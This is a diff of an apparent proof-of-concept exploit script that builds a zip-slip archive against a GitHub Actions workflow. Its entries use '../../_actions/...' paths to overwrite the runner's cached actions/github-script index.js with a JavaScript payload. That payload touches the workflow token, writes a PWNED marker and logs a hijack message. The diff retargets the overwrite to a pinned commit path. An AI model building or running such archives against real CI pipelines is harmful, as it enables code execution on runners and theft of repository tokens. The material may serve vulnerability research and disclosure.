@@ -20,7 +20,7 @@ cat > "$zipdir/payload.js" <<'JS'
       '/home/runner/work/PWNED.txt',
       'RCE-PAYLOAD-RAN token_prefix=' + String(token).slice(0, 12) + '\n'
     )
-    console.log('RCE-PAYLOAD-RAN')
+    console.log('HIJACKED-GITHUB-SCRIPT-RAN')
   } catch (e) {
     console.log('payload-error ' + e)
   }
@@ -35,9 +35,11 @@ out = os.path.join(d, 'report.zip')
 z = zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED)
 for n in ('base.json', 'pr.json', 'context.json'):
     z.write(os.path.join(d, n), n)
-# consumer extracts into $RUNNER_TEMP/bundle-size, so ../.. lands in /home/runner/work
-z.writestr('../../_actions/actions/github-script/v9/dist/index.js', payload)
-z.writestr('../../PWNED_ziptest.txt', 'zip-slip-escaped\n')
+# consumer extracts into $RUNNER_TEMP/pnpm-audit-result:
+#   ../            -> $RUNNER_TEMP
+#   ../../_actions -> /home/runner/work/_actions
+z.writestr('../ZIPSLIP_ESCAPED.txt', 'zip-slip-escaped\n')
+z.writestr('../../_actions/actions/github-script/ed597411d8f924073f98dfc5c65a23a2325f34cd/dist/index.js', payload)
 z.close()
 print('zip-size', os.path.getsize(out))
 PY
